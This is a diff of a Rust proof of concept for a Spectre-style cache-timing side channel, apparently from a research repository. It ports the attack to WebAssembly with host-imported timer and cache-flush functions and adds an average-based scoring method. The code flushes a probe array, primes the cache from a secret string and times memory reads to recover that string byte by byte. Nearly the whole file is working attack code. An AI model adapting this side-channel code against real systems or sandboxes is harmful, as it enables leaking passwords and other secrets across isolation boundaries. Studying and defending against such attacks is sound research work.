@@ -1,27 +1,45 @@
-//TODO define here the external functions for the POC
-// rdtsc, flush, and mfence
-// In case of regular x86 compilation, just add them from the libc
-#[cfg(all(target_arch = "x86_64"))]
+#![feature(asm_experimental_arch)]
+
 use std::arch::asm;
+#[cfg(all(target_arch = "x86_64"))]
 use std::arch::x86_64::_mm_clflush;
-use std::arch::x86_64::_mm_lfence;
+#[cfg(all(target_arch = "x86_64"))]
 use std::arch::x86_64::_mm_mfence;
+#[cfg(all(target_arch = "x86_64"))]
 use std::arch::x86_64::_rdtsc;
+
+// In case of wasm target, then this is imported from the host
+// Set the host name as wasi
+#[cfg(all(target_arch = "wasm32"))]
+extern "C" {
+    fn _rdtsc() -> u64;
+    fn _mm_clflush(ptr: *const u8);
+    fn _mm_mfence();
+    fn _mm_lfence();
+}
 
 // TODO, remove the tming based, use the 3/4 of the avg and the best,second best strategy, it is
 // more resilient
-const THRESHOLD: u64 = 120;
+// in Wasm it is larger !
+// TODO, make a mean based measurement instead of tming threshold.
+/*#[cfg(all(target_arch = "x86_64"))]
+const THRESHOLD: u64 = 80;
+#[cfg(all(target_arch = "wasm32"))]
+const THRESHOLD: u64 = 470;
+*/
 const STRIDE: usize = 512;
 
 const data_size: usize = 11;
 static mut public_data: [u8; 160] = [2; 160];
 
 const array_for_prediction: [u8; 256 * STRIDE] = [0; 256 * STRIDE];
+// If wasm target, move this from here, as well as the victim code
 const secret_data: &str = "My password";
 
 // To avoid optimization of the victim code
 static mut tmp: u8 = 0;
 
+#[cfg(all(target_arch = "x86_64"))]
 fn read_memory_offset(ptr: *const u8) -> u8 {
     let result: u8 = 0;
     unsafe {
@@ -29,6 +47,28 @@ fn read_memory_offset(ptr: *const u8) -> u8 {
             "mov {result}, [{x}]",
             x = in(reg) ptr,
             result = out(reg_byte) _
+        );
+    };
+    result
+}
+
+#[cfg(all(target_arch = "wasm32"))]
+#[no_mangle]
+fn read_memory_offset(ptr: *const u8) -> u8 {
+    let mut result = 0u8;
+    //println!("Reading from memory");
+    unsafe {
+        asm!(
+            // Push the ptr in the stack
+            "local.get {}",
+            "i32.load8_u 0",
+            //"i32.load8_u",
+            "local.set {}",
+            in(local) ptr,
+            lateout(local) result,
+            //result = out(reg_byte) _
+            options(nostack),
+
         );
     };
     result
@@ -52,26 +92,31 @@ fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
     for i in 0..256 {
         scores[i] = 0;
     }
-    #[cfg(feature = "tracing")]
+    /*#[cfg(feature = "tracing")]
     {
         eprint!("latencies = [")
-    }
+    }*/
     // Get the TRIES from env
-    let tries = std::env::var("TRIES").unwrap_or("100".to_string());
+    let tries = std::env::var("TRIES").unwrap_or("10000".to_string());
     let tries = tries.parse::<u64>().unwrap();
     for i in 0..tries {
-        #[cfg(feature = "tracing")]
+        /*#[cfg(feature = "tracing")]
         {
             eprint!("[");
-        }
+        }*/
         for i in 0..256 {
-            latencies[i] = 0;
+            // latencies[i] = 0;
         }
         // flush lines clflush
         // PRIME
         for j in 0..256 {
+            #[cfg(all(target_arch = "x86_64"))]
             unsafe {
                 _mm_clflush(&array_for_prediction[j * STRIDE] as *const u8);
+            }
+            #[cfg(all(target_arch = "wasm32"))]
+            unsafe {
+                _mm_clflush((j * STRIDE) as *const u8);
             }
         }
         // Wait a little to the cache to flush
@@ -82,7 +127,7 @@ fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
         }
 
         // Set the cache
-        for j in 0..100 {
+        for j in 0..200 {
             unsafe {
                 let addr = &array_for_prediction[secret_data_bytes[malicious_x] as usize * STRIDE]
                     as *const u8;
@@ -102,23 +147,35 @@ fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
                 tmp &= read_memory_offset(addr);
                 _rdtsc() - start
             };
-            if end < THRESHOLD {
+            latencies[mix_i] += end;
+            /*if end < THRESHOLD {
                 scores[mix_i] += 1;
             }
             #[cfg(feature = "tracing")]
             {
                 latencies[mix_i] = end;
+            }*/
+        }
+
+        let mut sum = 0;
+        for l in latencies {
+            sum += l;
+        }
+        //let avg = sum / 256;
+        for (i, l) in latencies.iter().enumerate() {
+            if 255 * l < 3 * sum / 4 {
+                scores[i] += 1;
             }
         }
 
-        #[cfg(feature = "tracing")]
+        /*#[cfg(feature = "tracing")]
         for l in latencies {
             eprint!("{}, ", l);
         }
         #[cfg(feature = "tracing")]
         {
             eprintln!("],");
-        }
+        }*/
 
         for j in 0..256 {
             // Get the best and the second best
@@ -130,21 +187,41 @@ fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
             }
         }
 
+        // patch from https://github.com/ikemmm/rust-spectre/blob/55a034a5272ff8644b09c3ad203fc6df7e80c5fd/src/main.rs#L260
+        // Swap max1 and max2 if the max1 is 0x00
+        if max1 as u8 == 0x00 {
+            let tmp1 = max1;
+            max1 = max2;
+            max2 = tmp1;
+        }
+
         score[0] = scores[max1 as usize];
         score[1] = scores[max2 as usize];
 
         value[0] = max1 as u64;
         value[1] = max2 as u64;
 
-        //if scores[max1 as usize] > 2 * scores[max2 as usize] {
-        // println!("Breaking");
-        //    break;
-        //}
+        /*if scores[max1 as usize] > 2 * scores[max2 as usize] {
+            #[cfg(feature = "tracing")]
+            println!("Breaking");
+            break;
+        }*/
     }
 
     #[cfg(feature = "tracing")]
     {
+        eprintln!("latencies = [");
+        for l in latencies {
+            eprint!("{},", l);
+        }
         eprintln!("]");
+
+        eprintln!("scores = [");
+        for l in scores {
+            eprint!("{},", l);
+        }
+        eprintln!("]");
+
         //eprint!("a = [");
         //for j in scores {
         //    eprint!("{}, ", j);
@@ -153,7 +230,7 @@ fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
     }
 
     // For some reason we need a time delay here
-    for _ in 0..100000 {}
+    for _ in 0..10000 {}
 
     //println!(" >");
     (score, value)
@@ -180,7 +257,7 @@ pub fn main() {
         public_data[15] = 16;
     }
 
-    for j in 0..11 {
+    for j in 0..4 {
         let (score, value) = read_memory_byte(j);
         // get value 0 as char
         let ch = value[0] as u8 as char;
@@ -190,7 +267,7 @@ pub fn main() {
         println!(
             // The value as char
             "Reading at malicious_x {} = {}:{}:{} (second {} {})",
-            j, ch, value[0], score[0], score[1], value[1]
+            j, ch, value[0], score[0], value[1], score[1]
         );
 
         #[cfg(not(feature = "tracing"))]
